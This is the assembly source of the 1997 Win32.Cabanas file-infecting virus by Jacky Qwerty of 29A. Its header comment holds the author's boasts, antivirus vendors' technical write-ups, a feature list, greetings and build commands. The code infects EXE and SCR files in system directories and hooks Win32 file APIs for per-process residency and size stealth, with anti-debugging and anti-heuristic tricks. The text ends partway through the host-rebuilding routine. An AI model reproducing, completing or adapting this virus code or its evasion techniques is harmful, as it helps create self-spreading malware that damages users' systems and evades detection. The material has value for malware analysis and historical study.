;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;          Win32.Cabanas.2999                      ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;          by Jacky Qwerty/29A                      ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;                                                  ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
; I'm very proud to introduce the first "resident" WinNT/Win95/Win32s virus.
; Not only it's the first virus stayin resident on NT, but is also the first
; with stealth, antidebuggin and antiheuristic capabilitiez. In short wordz,
; this babe is a "per process" memory resident, size stealth virus infecting
; Portable Executable filez on every existin  Win32-based  system. Those who
; dont know what a "per process" resident virus is, it means a virus staying
; resident inside the host Win32 aplication's private space, monitoring file
; activity and infectin PE filez opened or accesed by such Win32 aplication.
;
; The purpose of this virus is to prove new residency techniquez that can be
; exploited from genuine Win32 infectorz, without all the trouble of writing
; especific driverz for Win95 (VxDs), and WinNT. A genuine Win32 infector is
; a virus bein able to work unmodified across all Win32 platformz available:
; Win95, WinNT and any other future platform suportin the Win32 API interfa-
; ce. So far only Win95 especific virusez have been found, not Win32 genuine
; onez. Make sure to read the complete description about Win32.Cabanas writ-
; ten by P‚ter Sz”r, available at http://www.avp.ch/avpve/newexe/win32/caba-
; nas.stm. U can also read description by Igor Daniloff from Dr.Web, availa-
; ble at http://www.dials.ccas.ru/inf/cabanas.htm as well.
;
; After readin P‚ter Sz”r's description about Win32.Cabanas, i realized he'd
; really made a very serious profesional work. So good that he didnt seem to
; miss any internail detail in  the virus, as if he  had actually writen the
; bug himself or as if he was actually me, hehe. Obviosly, none of the prior
; onez are true. But, nevertheless, i think it's worth to take his work into
; account even from the VX side of the fence. Really i dunno what's left for
; me to say after such description, so i will simply add my own personal co-
; mentz to P‚ter's log. Erm.. btw why dont u join us? heh >8P
;
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
; 1. Technical Description
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Win32.Cabanas is the first known 32-bit virus that works under Windows NT
; Server, Windows NT workstation, Windows 95 and Windows 3.x extended with
; Win32s sub-system. It was found in late 1997.
;
; Win32.Cabanas is a per-process memory resident, fast infecting, antidebug-
; ged, partially packed/encrypted, anti-heuristic, semi-stealth virus. The
; "Win32" prefix is not misleading, as the virus is also able to spread in
; all Win32 based systems: Windows NT, Windows 95 and Win32s. The author of
; the virus is a member of the 29A group, the same young virus writer who
; wrote the infamous CAP.A virus.
;
;
; 1.1. Running an infected PE file
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; When a Win32.Cabanas infected file is executed, the execution will start
; at the original host entry point. Surprisingly, Cabanas does not touch
; the entry point field in the Image File Header. Instead it patches the
; host program at its entry point. Five bytes at the entry point is replaced
; with a FAR JMP to the address where the original program ended. This can
; be considered as an anti-heuristic feature, as the host entry point value
; in the PE header keeps pointing inside the code section, possibly turning
; off some heuristic flags.
;
; Thus the first JMP points to the real entry point. The first function in
; Cabanas unpacks and decrypts a string table which consists of Win32 KERNEL
; API names. The unpack mechanism is simple but effective enough. Cabanas is
; also an armored virus. It uses "Structured Exception Handling" (typically
; abbreviated as "SEH") as an anti-debug trick. This prevents debugging from
; any application-level debugger, such as TD32.
;
; When the unpack/decryptor function is ready, the virus calls a routine to
; get the original Base Address of KERNEL32.DLL. During infection time, the
; virus searches for GetModuleHandleA and GetModuleHandleW API in the Import
; Table, respectively. When it finds them, it saves a pointer to the actual
; DWORD in the .idata list. Since the loader puts the addresses to this
; table before it executes the virus, Cabanas gets them easily.
;
; If the application does not have a GetModuleHandleA / GetModuleHandleW API
; import, the virus uses a third undocumented way to get the Base Address of
; KERNEL32.DLL by getting it from the ForwarderChain field in the KERNEL32
; import. Actually this will not work under Windows NT, but on Win95 only.
; When the virus has the Base Address/Module Handle of KERNEL32.DLL, it
; calls its own routine to get the address of GetProcAddress function. The
; first method is based on the search of the Import Table during infection
; time. The virus saves a pointer to the .idata section whenever it finds a
; GetProcAddress import in the host. In most cases Win32 applications import
; the GetProcAddress API, thus the virus should not use a secondary routine
; to get the same result. If the first method fails, the virus calls another
; function which is able to search for GetProcAddress export in KERNEL32.
; Such function could be called as GetProcAddress-From-ExportsTable. This
; function is able to search in KERNEL32's Exports Table and find the
; address of GetProcAddress API.
;
; This function is one of the most important ones from the virus point of
; view and it is compatible with all Win32 based systems. If the entry point
; of GetProcAddress was returned by the GetProcAddress-From-ExportsTable
; function, the virus saves this address and use it later on. Otherwise, the
; GetProcAddress-From-ExportsTable function will be used several times. This
; function is also saved with "Structured Exception Handling" to avoid from
; possible exceptions. After this, the virus gets all the API addresses it
; wants to use in a loop. When the addresses are available, Cabanas is ready
; to replicate and call its direct action infection routine.
;
;
; 1.2. Direct action infection
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; The direct action infection part is surprisingly fast. Even though the
; virus goes through all the files in Windows directory, Windows System
; directory and in the current directory respectively, the file infection
; is fast enough to go unnoticed in much systems. This is because the virus
; works with "memory mapped files", a new feature implemented in Win32 based
; systems which simplifies file handling and increases system performance.
;
; First the virus gets the name of Windows directory, then it gets the name
; of Windows System directory and calls the function which searches for non-
; infected executable images. It searches for non directory entries and
; check the size of the files it found.
;
; Files with size dividable by 101 without reminder are assumed to be
; infected. Other files which are too huge will not be infected either.
; After this, the virus checks the file extension, if it matches EXE or
; SCR (screen saver files), the virus opens and maps the file. If the file
; is considered too short, the file is closed. Then it checks the`MZ' marker
; at the beginning of the image. Next it positions to the possible `PE'
; header area and checks the `PE' signature. It also checks that the
; executable was made to run on 386+ machines and looks for the type of
; the file. DLL files are not infected.
;
; After this, the virus calculates a special checksum which uses the
; checksum field of PE files Optional Header and the file-stamp field of
; the Image File Header. If the file seems to be infected the virus closes
; the file. If not, the file is chosen for infection. Cabanas then closes
; the file, blanks the file attribute of the file with SetFileAttributeA API
; and saves the original attributes for later use. This means the virus is
; not stopped by the "Read Only" attribute. Then again, it opens and maps
; the possible host file in read/write mode.
;
; Next it searches for the GetModuleHandleA, GetModuleHandleW and
; GetProcAddress API imports in the host Import Table and calculates
; pointers to the .idata section. Then it calls the routine which
; patches the virus image into the file.
;
; This routine first checks that the .idata section has MEM_WRITE
; characteristics. If not it sets this flag on the section, but only if
; this section is not located in an executable area. This prevents the
; virus from turning on suspicious flags on the code section, triggered
; by some heuristic scanner.
;
; Then it goes to the entry point of the image and replaces five bytes
; with a FAR JMP instruction which will point to the original end of the
; host. After that it checks the relocation table. This is because some
; relocations may overwrite the FAR JMP at the entry point. If the
; relocation table size is not zero the virus calls a special routine
; to search for such relocation entries in the .reloc area. It clears
; the relocation type on the relocation record if it points into the FAR
; JMP area, thus this relocation will not take into account by the loader.
; The routine also marks the relocation, thus Cabanas will be able to
; relocate the host later on. Then it crypts all the information which has
; to be encrypted in the virus body. Including the table which holds the
; original 5 bytes from the entry point and its location.
;
; Next the virus calculates the special checksum for self checking purposes
; and saves this to the time stamp field of the PE header. When everything
; is ready, the virus calculates the full new size of the file and makes
; this value dividable by 101. The real virus code is around 3000 bytes
; only but the files will grow with more bytes, because of this. Cabanas
; has a very important trick here. The virus does not create a new section
; header to hold its code, but patches the last section header in the file
; (usually .reloc) to grow the section body large enough to store the virus
; code. This makes the infection less risky and less noticeable.
;
; Then the virus changes the SizeOfImage field in the PE header to reflect
; the changes made to the last section in the file, then unmaps and closes
; the file. Next it truncates the file at the previously calculated size
; and restores the original time and date stamp. Finally Cabanas resets the
; original attribute of the file. When all the possible files have been
; checked for infection, Cabanas is ready to go memory resident.
;
;
; 1.3. Rebuild the host, Hook API functions and Go memory resident
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; The next phase is to rebuild the host program. The virus locates an
; internal parameter block which consists of the previously encrypted code
; from the host (5 bytes) and writes back the 5 original bytes at the entry
; point. After this, it relocates the code area if needed, by searching in
; the .reloc section for marked relocation entries. Next the virus hooks
; API functions and goes memory resident.
;
; The API hooking technique is based on the manipulation of the Import
; Table. Since the host program holds the addresses of imported functions
; in its .idata section, all the virus has to do is to replace those
; addresses to point to its own API handlers.
;
; To make those calculations easy, the virus opens and maps the infected
; program. Then it allocates memory for its per-process part. The virus
; allocates a 12232 bytes block and copies itself into this new allocated
; area. Then it searches for all the possible function names it wants to
; hook: GetProcAddress, GetFileAttributesA, GetFileAttributesW, MoveFileExA,
; MoveFileExW, _lopen, CopyFileA, CopyFileW, OpenFile, MoveFileA, MoveFileW,
; CreateProcessA, CreateProcessW, CreateFileA, CreateFileW, FindClose,
; FindFirstFileA, FindFirstFileW, FindNextFileA, FindNextFileW, SetFileAttrA,
; SetFileAttrW. Whenever it finds one of the latter APIs, it saves the
; original address to its own JMP table and replaces the .idata section's
; DWORD (which holds the original address of the API) with a pointer to its
; own API handlers.  Finally the virus closes and unmaps the host and starts
; the application, by jumping into the original entry point in the code
; section.
;
; Some Win32 applications however may not have imports for some of these
; file related APIs, they can rather retrieve their addresses by using
; GetProcAddress and call them directly, thus the virus would be unable
; to hook this calls. Not so fast. The virus also hooks GetProcAddress
; for a special purpose. GetProcAddress is used by most applications.
; When the application calls GetProcAddress the virus new handler first
; calls the original GetProcAddress to get the address of the requested
; API. Then it checks if the Module Handle parameter is from KERNEL32 and
; if the function is one of the KERNEL32 APIs that the virus wants to hook.
; If so, the virus returns a new API address which will point into its
; NewJMPTable. Thus the application will still get an address to the virus
; new handler in such cases as well.
;
;
; 1.4. Stealth and fast infection capabilities
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Cabanas is a semi-stealth virus: during FindFirstFileA,  FindFirstFileW,
; FindNextFileA and FindNextFileW, the virus checks for already infected
; programs. If the program is not infected the virus will infect it,
; otherwise it hides the file size difference by returning the original
; size for the host program. During this, the virus can see all the file
; names the application accesses and infects every single clean file.
;
; Since the CMD.EXE (Command Interpreter of Windows NT) is using the above
; APIs during a DIR command, every non infected file will be infected (if
; the CMD.EXE was infected previously by Win32.Cabanas). The virus will
; infect files during every other hooked API request as well.
;
; Apart from the encrypted API names strings, the virus also contains the
; following copyright message:
;
; (c) Win32.Cabanas v1.0 by jqwerty/29A.
;
;
; 1.5. Conclusion
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Win32.Cabanas is a very complex virus with several features new in Win32
; based systems. It shows quite interesting techniques that can be used in
; the near future. It demonstrates that a Windows NT virus should not have
; any Windows 95 or Windows NT especific functionality in order to work on
; any Win32 system. The "per-process" residency technique also shows a
; portable viable solution to avoid known compatibility issues between
; Windows 95 and Windows NT respecting their low level resident driver
; implementations. Virus writers can use these techniques and their
; knowledge they have had on Windows 95 to come to a more robust platform.
; So far Win32.Cabanas has made this first step.
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
;
; 2. Shortcutz
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; (*) http://www.dials.ccas.ru/inf/cabanas.htm
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;                     Win32.Cabanas: A brief description
;                     ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;                                                           Igor A. Daniloff
;
; Win32.Cabanas is the first known virus that infects files under Microsoft
; 32-bit Windows operating systems (Win32s/Windows 95/Windows NT). Not only
; is it capable of infecting PortableExecutable files, but also remains
; resident in the current session of an infected program in all these
; Windows systems.
;
; The viruses specifically designed for Windows 95 thus far could not
; properly infect files in Windows NT. Although files of Windows 95 and
; Windows NT have identical PE format, certain fields in their PE headers
; are different. Therefore, for infecting files under Windows NT, the PE
; header must be modified appropriately; otherwise Windows NT would display
; an error message in the course of loading the file. Furthermore, viruses
; encounter certain problems in determining the base addresses of WIN32
; KERNEL API in the memory, because KERNEL32.DLL in Windows 95 and Windows
; NT are located at different memory addresses. But Win32.Cabanas smartly
; handles these problems. On starting an infected file, the virus gets
; control, unpacks and decrypts its table of names of WIN32 KERNEL API
; procedures that are needed in the sequel, and then determines the base
; address of KERNEL32.DLL and the addresses of all necessary WIN32 KERNEL
; API functions.
;
; While infecting a file, Win32.Cabanas finds the names of GetModuleHandleA,
; GetModuleHandleW, and GetProcAddress functions from the Import Table and
; stores in its code the offsets of the addresses of these procedures in the
; Import Table (in the segment .idata, as a rule). If the names of these
; procedures are not detectable, Win32.Cabanas uses a different undocumented
; method of finding the base address of KERNEL32 and the addresses of WIN32
; KERNEL API. But there is a bug in this undocumented method; therefore the
; method is inoperative under Windows NT. If the addresses of
; GetModuleHandleA or GetModuleHandleW functions are available in the Import
; Table of the infected file, the virus easily determines the WIN32 KERNEL
; API addresses through the GetProcAddress procedure. If the addresses are
; not available in the Import Table, the virus craftily finds the address of
; GetProcAddress from the Export Table of KERNEL32. As already mentioned,
; this virus mechanism is not operative under Windows NT due to a bug, and,
; as a consequence, the normal "activity" of the virus is disabled. This is
; the only serious bug that prevents the proliferation of Win32.Cabanas
; under Windows NT. On the contrary, in Windows 95 the virus "feels
; completely at home" and straightforwardly (even in the absence of the
; addresses of GetModuleHandleA or GetModuleHandleW) determines the base
; address of KERNEL32.DLL and GetProcAddress via an undocumented method.
;
; Using the GetProcAddress function, Win32.Cabanas can easily get the
; address of any WIN32 KERNEL API procedure that it needs. This is precisely
; what the virus does: it gets the addresses and stores them.
;
; Then Win32.Cabanas initiates its engine for infecting EXE and SCR PE-files
; in \WINDOWS, \WINDOWS\SYSTEM, and the current folder. Prior to infecting a
; file, the virus checks for a copy of its code through certain fields in
; the PE header and by the file size, which for an infected must be a
; multiple of 101. As already mentioned, the virus searches for the names of
; GetModuleHandleA, GetModuleHandleW or GetProcAddress in the Import Table
; and saves the references to their addresses. Then it appends its code at
; the file end in the last segment section (usually, .reloc) after modifying
; the characteristics and size of this section. Thereafter, the virus
; replaces the five initial bytes of the original entry point of the code
; section (usually, .text or CODE) by a command for transferring control to
; the virus code in the last segment section (.reloc). For this purpose, the
; virus examines the relocation table (.reloc) for finding some element in
; the region of bytes that the virus had modified. If any, the virus
; "disables" the reference and stores its address and value for restoring
; the initial bytes of the entry point at the time of transfer of control
; to the host program and, if necessary, for appropriately configuring the
; relocation.
;
; After infecting all files that yield to infection in \WINDOWS, \WINDOWS\
; SYSTEM, and in the current folder, the virus plants a resident copy into
; the system and "intercepts" the necessary system functions. Using
; VirtualAlloc, the virus allots for itself 12232 bytes in the memory and
; plants its code there. Then it tries to "intercept" the following WIN32
; KERNEL API functions: GetProcAddress, GetFileAttributesA,
; GetFileAttributesW, MoveFileExA, MoveFileExW, _loopen, CopyFileA,
; CopyFileW, OpenFile, MoveFileA, MoveFileW, CreateProcessA, CreateProcessW,
; CreateFileA, CreateFileW, FindClose, FindFirstFileA, FindFirstFileW,
; FindNextFileA, FindNextFileW, SetFileAttrA, and SetFileAttrW. The virus
; "picks up" the addresses of these functions from the Import Table, and
; writes the addresses of its handlers in the Import Table. On failing to
; "intercept" certain necessary functions, the virus, when the host program
; calls for the GetProcAddress function, verifies whether this function is
; necessary for the host program, and returns the address of the virus
; procedure to host program if necessary. When a program calls for certain
; functions that have been "intercepted" by Win32.Cabanas, the file
; infection  engine and/or the stealth mechanism are\is initialized. Thus,
; when FindFirstFileA, FindFirstFileW, and FindNextFileA or FindNextFileW
; functions are called, the virus may infect the file which is being
; searched and hide the increase in the infected file size.
;
; Win32.Cabanas cannot be regarded as a "true resident" virus, because it
; "intercepts" system functions and installs its copy in a specific memory
; area only in the current session of an infected program. But what will
; happen on starting, for example, an infected Norton Commander for Windows
; 95 or Command Interpreter for Windows NT? Or a resident program? Indeed,
; Win32.Cabanas will also "work hard" side by side with such a program until
; it is terminated.
;
; Win32.Cabanas contains an encrypted text string
; "(c) Win32.Cabanas v1.0 by jqwerty/29A"
;
; (c) 1997 DialogueScience, Inc., Moscow, Russia. All rights reserved.
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
;
; 3. Main featurez
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; * Platformz:      WindowsNT, Windows95, Win32s, i.e. all Win32 platformz.
; * Residency:      Yes, "Per Process", workin on all Win32 systemz.
; * Non-Residency:  Yes, direct action, infects PEz before goin resident.
; * Stealth:        Yes, size stealth of inf.filez (F-Potatoe95 fooled).
; * AntiDebuging:   Yes, TD32 or any other "aplication" level debuger
;                        generates an exception when debugin an infected
;                        aplication. This obviosly doesnt aply for Soft-ICE
;                        for Windows95, a big monster.
; * AntiHeuristicz: Yes, inf.filez have no obvious symptomz of infection.
;                        Other Win95 virusez tend to "mark" the PE header so
;                        they are easily noticeable. See: Other featurez (e).
; * AntiAntivirus:  Yes, disinfection of inf.filez is almost *imposible*.
; * Fast infection: Yes, filez are infected when accesed for any reason.
; * Polymorphism:    No, the poly engine was stripped and removed on purpose.
; * Other featurez:
;                   (a) The EntryPoint field in the PE hdr is not modified.
;                   (b) Win32 file API functionz are hooked for infection and
;                       stealth purposez but also for platform compatibility.
;                   (c) Use of the Win32 "File-Maping" API functionz, thus
;                       implementin "Memory-Mapped Filez". No more "ReadFile",
;                       "SetFilePointer", "WriteFile"... it was about time.
;                   (d) Absolutely no use of absolute adressez in sake of
;                       compatibility with other future Win32 releasez.
;                   (e) The SHAPE AV program sucks, but sadly it was the best
;                       thing detectin PE infected filez heuristicaly. Well
;                       almost as it didnt triger a single flag on this one :)
;                   (f) Use of "Structured Exception Handling" (SEH) in those
;                       critical code fragmentz that could generate GP faultz,
;                       i.e. exceptionz are intercepted and handled properly.
;                   (g) Unicode suport. This babe really works in NT. No lie.
;
;
; 4. Who was Cabanas?
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Gonzalo Cabanas used to  be a daydream  believer. We shared several thingz
; in comon, heard same R.E.M music  style, wore  the same ragged blue jeanz,
; and behaved like kidz everywhere we went together, putin tackz on the tea-
; cher's chair, stealin some classmate's lunch  and so on. We even liked the
; same girlz, which explains why  we sometimez ended up punchin each other's
; face from time to time. However, u could  find us the next day, smoking a-
; round  by the skoolyard as  if nothin  had ever hapened. We  were the best
; friendz ever. I know this virus wont return him back to life, nor "will do
; him justice", however, i still wanted to somewhat dedicate this program in
; his honor.
;
;
; 5. Greetz
; ÄÄÄÄÄÄÄÄÄ
; The greetz go to:
;
;   Gonzo Cabanas ......... Hope to see u somewhere in time.. old pal!
;   Murkry ................ Whoa.. i like yer high-tech ideaz budie!
;   VirusBuster/29A ....... U're the i-net man pal.. keep doin it!
;   Vecna/29A ............. Keep up the good work budie.. see ya!
;   l- .................... Did ya ask for some kick-ass lil' creature? X-D
;   Int13 ................. Hey pal.. u're also a southamerican rocker! ;)
;   Peter/F-Potatoe ....... Yer description rulez.. Mikko's envy shines!
;   DV8 (H8), kdkd, etc ... Hey budiez.. now where da hell are u?
;   GriYo, Sandy/29A ...... Thx for yer patience heh X-D
;
;
; 6. Disclaimer
; ÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This source code is for educational  purposez only. The author is not res-
; ponsable for any problemz caused due to the assembly of this file.
;
;
; 7. Compiling it
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; tasm32 -ml -m5 -q -zn cabanas.asm
; tlink32 -Tpe -c -x -aa cabanas,,, import32
; pewrsec cabanas.exe
;
;
; (c) 1997 Jacky Qwerty/29A.


.386p           ;generate 386+ protected mode instructionz
.model  flat    ;no segmentz and a full 32-bit offset.. what a dream ;)

;Some includez containin very useful structurez and constantz for Win32

include Useful.inc
include Win32API.inc
include MZ.inc
include PE.inc

;Some equ's needed by the virus

nAPIS           =       1*1024         ;size of jump table holdin hooked APIz
nHANDLEZ        =       2*1024 + 512   ;size of Handlez table
nPATHNAMEZ      =       4*1024 + 512   ;size of PathNamez table

extrn   GetModuleHandleA :proc  ;APIz used durin first generation only
extrn   GetProcAddress   :proc

.data
        db      ?       ;some dummy data so tlink32 dont yell

.code

;Virus code starts here

v_start:

        call    get_base

code_table:

        dd      12345678h       ;host RVA entry point
        dw      1               ;number of bytez
        db      ?               ;bytez to patch
        dw      0               ;end of parameter block

code_start:

;Packed APIz needed by the virus. They will travel in packed/encrypted form

ve_stringz:

veszKernel32            db      'KERNEL32',0
veszGetModuleHandleA    db      'GetModuleHandleA'
veszGetModuleHandleW    db      80h,17

eExts                   db      'fxEtcR',0      ;list of file extensionz

veszGetProcAddress      db      'GetProcAddress',0
veszGetFileAttributesA  db      'Ge','t'+80h,'AttributesA'
veszGetFileAttributesW  db      80h,19
veszMoveFileExA         db      'Mov','e'+80h,'ExA'
veszMoveFileExW         db      80h,12
vesz_lopen              db      '_lopen',0
veszCopyFileA           db      'Cop','y'+80h,'A'
veszCopyFileW           db      80h,10
veszOpenFile            db      'Ope','n'+80h,0
veszMoveFileA           db      'Mov','e'+80h,'A'
veszMoveFileW           db      80h,10
veszCreateProcessA      db      'CreateProcessA'
veszCreateProcessW      db      80h,15
veszCreateFileA         db      'Creat','e'+80h,'A'
veszCreateFileW         db      80h,12
veszFindClose           db      'FindClose',0
veszFindFirstFileA      db      'FindFirs','t'+80h,'A'
veszFindFirstFileW      db      80h,15
veszFindNextFileA       db      'FindNex','t'+80h,'A'
veszFindNextFileW       db      80h,14
veszSetFileAttributesA  db      'Se','t'+80h,'AttributesA'
veszSetFileAttributesW  db      80h,19
veszCloseHandle         db      'CloseHandle',0
veszCreateFileMappingA  db      'Creat','e'+80h,'MappingA',0
veszMapViewOfFile       db      'MapViewO','f'+80h,0
veszUnmapViewOfFile     db      'UnmapViewO','f'+80h,0
veszSetFilePointer      db      'Se','t'+80h,'Pointer',0
veszSetEndOfFile        db      'SetEndO','f'+80h,0
veszSetFileTime         db      'Se','t'+80h,'Time',0
veszGetWindowsDirectory db      'GetWindowsDirectoryA',0
veszGetSystemDirectory  db      'GetSystemDirectoryA',0
veszGetCurrentProcess   db      'GetCurrentProcess',0
veszGetModuleFileName   db      'GetModul','e'+80h,'NameA',0
veszWriteProcessMemory  db      'WriteProcessMemory',0
veszWideCharToMultiByte db      'WideCharToMultiByte',0
veszVirtualAlloc        db      'VirtualAlloc',0

eEndOfFunctionNamez     db      0

;Copyright and versionz

eszCopyright    db      "(c) Win32.Cabanas v1.1 by jqwerty/29A.",0

ve_string_size  =       $ - ve_stringz

get_base:

        mov     ecx,ve_string_size      ;get size of packed/encrypted stringz
        mov     esi,[esp]               ;get pointer to packed/encrypted stringz
        xor     ebx,ebx
        mov     eax,esi
        sub     esi,ecx
        cld
        sub     dword ptr [esp],code_table - seh_fn
        add     esi,[eax - 4]
        push    dword ptr fs:[ebx]      ;set SEH frame.. ever seen FS in action? X-D
        lea     edi,[esi + pCodeTable - ve_stringz]
        stosd                           ;save pointer to code_table
        add     eax,12345678h
delta_host =    dword ptr $ - 4
        stosd                           ;save actual host base adress
        mov     eax,esi
        stosd                           ;save pointer to virus start

ebp_num =       ddGetProcAddress + 7Fh
tmp_edi =       pcode_start + 4

        mov     fs:[ebx],esp
        pushad
        xchg    eax,[ebx - 2]           ;go away lamerz and wannabeez..
        db      2Dh

seh_rs: sub     edi,tmp_edi - v_stringz ;get pointer to KERNEL32 API name
        pop     eax
        push    edi                     ;pass the pointer twice
        push    edi

decrypt_stringz:                ;decrypt/unpack API namez and other stringz

        lodsb
        rol     al,cl
        xor     al,0B5h
        jns     d_stor
        add     al,-80h
        jnz     d_file
        stosb                   ;expand/unpack unicode API name
        xor     eax,eax
        lodsb
        push    esi
        xchg    ecx,eax
        mov     esi,edx
        rep     movsb
        xchg    ecx,eax
        sub     byte ptr [edi - 2],'A'-'W'
        pop     esi
        jmp     d_updt
d_file: stosb
        xor     eax,eax
        sub     eax,-'eliF'     ;expand to 'File' where aplies
        stosd
        cmp     al,?
        org     $ - 1
d_stor: stosb
        jnz     d_loop
d_updt: mov     edx,edi
d_loop: loop    decrypt_stringz ;get next character

        call    MyGetModuleHandleA      ;get KERNEL32 base adress (first try)
        pop     esi
        jnz     gotK32                  ;jump if found
        sub     ecx,ecx
        xor     eax,eax
        mov     cl,9
        push    edi
        cld

copy_K32W:      ;make unicode string for KERNEL32

        lodsb
        stosw
        loop    copy_K32W
        call    MyGetModuleHandleW      ;get KERNEL32 base adress (second try)
        jnz     gotK32                  ;jump if found
        call    MyGetModuleHandleX      ;get KERNEL32 base adress (third try)
        jnz     gotK32                  ;jump if found

quit_app:

        pop     eax             ;shit.. KERNEL32 base adress not found
        ret                     ;try to quit aplication via an undocumented way

        db      67h                             ;some prefix to confuse lamerz
seh_fn: mov     eax,[esp.EH_EstablisherFrame]
        lea     esp,[eax - cPushad]
        popad
        xor     eax,eax
        lea     ebp,[edi + ebp_num - tmp_edi]
        pop     dword ptr fs:[eax]              ;remove SEH frame
        jmp     seh_rs

gotK32: mov     [ebp + K32Mod - ebp_num],eax    ;store KERNEL32 base adress
        cmp     dword ptr [ebp + ddGetProcAddress - ebp_num],0
        xchg    ebx,eax
        jnz     find_APIs               ;got RVA pointer to GetProcAdress API?
        lea     esi,[ebp + vszGetProcAddress - ebp_num]
        call    MyGetProcAddressK32     ;no, get adress of GetProcAdress directly
        jecxz   find_APIs
        lea     eax,[ebp + ddGetProcAddress2 - ebp_num]
        mov     [eax],ecx
        sub     eax,[ebp + phost_hdr - ebp_num]
        mov     [ebp + ddGetProcAddress - ebp_num],eax

find_APIs:      ;find file related API adressez from KERNEL32..

        lea     esi,[ebp + FunctionNamez - ebp_num]
        lea     edi,[ebp + FunctionAdressez - ebp_num]

GetAPIAddress:

        call    MyGetProcAddressK32     ;get API adress
        jecxz   quit_app
        cld
        xchg    eax,ecx
        stosd                           ;save retrieved API adress
        @endsz                          ;point to next API name
        cmp     [esi],al                ;end of API namez reached?
        jnz     GetAPIAddress           ;no, get next API adress

        lea     ebx,[ebp + Process_Dir - ebp_num]
        lea     edi,[ebp + PathName - ebp_num]
        push    7Fh
        push    edi
        call    [ebp + ddGetWindowsDirectoryA - ebp_num]
        call    ebx                     ;infect filez in WINDOWS directory
        push    7Fh
        push    edi
        call    [ebp + ddGetSystemDirectoryA - ebp_num]
        call    ebx                     ;infect filez in SYSTEM directory
        xor     eax,eax
        mov     byte ptr [edi],'.'
        inc     eax
        call    ebx                     ;infect filez in current directory

build_host:     ;rebuild the host..

        mov     esi,[ebp + pCodeTable - ebp_num] ;get code table of host
        mov     ebx,[ebp + phost_hdr - ebp_num]  ;get host base adress
        cld
        lodsd
        add     eax,0B2FD26A3h          ;decrypt original entry point RVA
add_1st_val =   dword ptr $ - 4
        xchg    edi,eax
        add     edi,ebx
        push    edi                     ;save entry point for l8r retrieval

get_count:

        call    [ebp + ddGetCurrentProcess - ebp_num]   ;get pseudo-handle for current process
        xchg    ecx,eax
        cld
        lodsw                   ;get number of bytes to copy
        cwde
        xchg    ecx,eax
        mov     edx,ecx
        push    ecx     ;push parameterz to WriteProcessMemory API
        push    eax
        push    esp     
        push    ecx
        push    esi
        push    edi
        push    eax

decrypt_hostcode:       ;decrypt the chunk of original host code previosly encrypted..

        lodsb
        xor     al,06Ah
xor_2nd_val =   byte ptr $ - 1
        rol     al,cl
        mov     [esi-1],al
        loop    decrypt_hostcode
        sub     ecx,12345678h
old_base =      dword ptr $ - 4
        add     ecx,ebx         ;has host base adress been relocated?
        jz      write_chunk     ;no, relocation fix not necesary.. jump

        ;fix code pointed to by one or more nulified relocationz..

        pushad                          ;get RVA start of relocation section..
        lea     esi,[ebx.MZ_lfanew]
        sub     edi,ebx
        add     esi,[esi]
        mov     ecx,[esi.NT_OptionalHeader      \ ;get size of relocation dir.
                        .OH_DirectoryEntries    \
                        .DE_BaseReloc           \
                        .DD_Size                \
                        -MZ_lfanew]
        jecxz   _popad
        mov     esi,[esi.NT_OptionalHeader      \ ;get RVA to relocation section
                        .OH_DirectoryEntries    \
                        .DE_BaseReloc           \
                        .DD_VirtualAddress      \
                        -MZ_lfanew]
        call    redo_reloc      ;pass adress of fix_relocs label as a parameter

fix_relocs:  ;process relocation block and look for nulified relocationz..

        lodsw                                   ;get relocation item
        cwde
        dec     eax
        .if     sign?
        jnc     f_next_reloc                    ;if first item, jump to get next relocation item
        .endif
        test    ah,mask RD_RelocType shr 8      ;is relocation nulified?
        jnz     f_next_reloc                    ;no, jump to get next relocation item
        lea     eax,[eax + ebx + 5]
        cmp     edi,eax                         ;relocation item points inside chunk of code?
        jnc     f_next_reloc                    ;no, jump to get next relocation item
        add     eax,-4
        cmp     eax,edx
        jnc     f_next_reloc                    ;no, jump to get next relocation item

        ;relocation item is pointing inside chunk of code.. add delta to fix it..

        pushad
        mov     ebx,[esp.(4*Pshd).cPushad.Pushad_ebx] ;get actual host base adress
        mov     ebp,[ebx + edi - 4]
        mov     ecx,[esp.(3*Pshd).(2*cPushad).Arg3]   ;get pointer to chunk of code inside code table
        mov     ebx,[ebx + edx]
        xchg    ebp,[ecx - 4]
        sub     ecx,edi
        mov     esi,[esp.(4*Pshd).cPushad.Pushad_ecx] ;get relocation delta to add
        xchg    ebx,[edx + ecx]
